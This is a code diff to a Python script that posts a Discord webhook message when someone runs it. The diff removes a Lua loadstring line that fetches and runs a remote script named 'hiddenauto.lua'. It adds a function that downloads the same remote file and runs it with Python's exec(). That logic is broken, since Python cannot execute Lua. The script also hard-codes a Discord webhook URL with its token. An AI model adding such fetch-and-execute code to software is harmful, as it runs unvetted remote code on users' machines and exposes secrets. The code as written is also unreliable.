@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/scripts/main/hiddenauto.lua"))()
-
 import requests
 import json
 
@@ -16,7 +14,15 @@ def send_discord_notification(webhook_url, message):
     else:
         print(f"Failed to send notification to Discord. Status code: {response.status_code}")
 
+def execute_lua_script(script_url):
+    script = requests.get(script_url).text
+    exec(script)
+
 # Example usage:
 webhook_url = "https://discord.com/api/webhooks/1217348383170236467/17G9oEQYtyvAxdhgScnSLCr6K6BGvZI6Pyb9-pqEqsc2_CJW7gBhtEPSdZZThYHB3vuy"
-message = " @everyone Someone executed the script!"
+script_url = "https://raw.githubusercontent.com/Justanotherdme/scripts/main/hiddenauto.lua"
+
+message = "Someone executed the script!"
 send_discord_notification(webhook_url, message)
+
+execute_lua_script(script_url)
